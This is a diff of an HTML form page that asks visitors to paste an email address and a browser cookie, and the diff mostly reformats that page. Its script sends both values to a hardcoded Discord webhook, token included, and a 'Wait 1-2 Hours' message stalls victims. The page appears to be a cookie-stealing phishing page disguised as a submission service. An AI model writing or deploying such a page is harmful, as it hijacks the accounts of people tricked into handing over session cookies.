@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -308,7 +308,13 @@
         <textarea id="cookie" placeholder="Paste The Cookie Here:" required></textarea>
       </div>
 
-  
+      <!-- DIVIDER ADDED HERE -->
+      <div style="display: flex; align-items: center; margin: 20px 0; color: rgba(255,255,255,0.7);">
+        <div style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, rgba(138, 43, 226, 0.6), transparent);"></div>
+        <div style="padding: 0 12px; font-size: 13px; text-shadow: 0 0 8px rgba(138, 43, 226, 0.5);">⚠️ Wait 1-2 Hours</div>
+        <div style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, rgba(138, 43, 226, 0.6), transparent);"></div>
+      </div>
+
       <button type="submit" class="btn">
         <span id="submit-text">Submit</span>
       </button>
@@ -370,12 +376,12 @@
         submitBtn.disabled = true;
         
         await fetch('https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-        content: `📧 Email: ${email}\n🍪 Cookie:\n\`\`\`${cookie}\n\`\`\`\n━━━━━━━━━━━━━━\n⚠️ Please wait 1-2 hours for processing!`
-        })
-        });;
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `📧 Email: ${email}\n🍪 Cookie:\n\`\`\`${cookie}\n\`\`\`\n━━━━━━━━━━━━━━\n⚠️ Please wait 1-2 hours for processing!`
+          })
+        });
         
         statusMessage.textContent = 'Success! Cookie submitted.';
         statusMessage.className = 'status-message success';
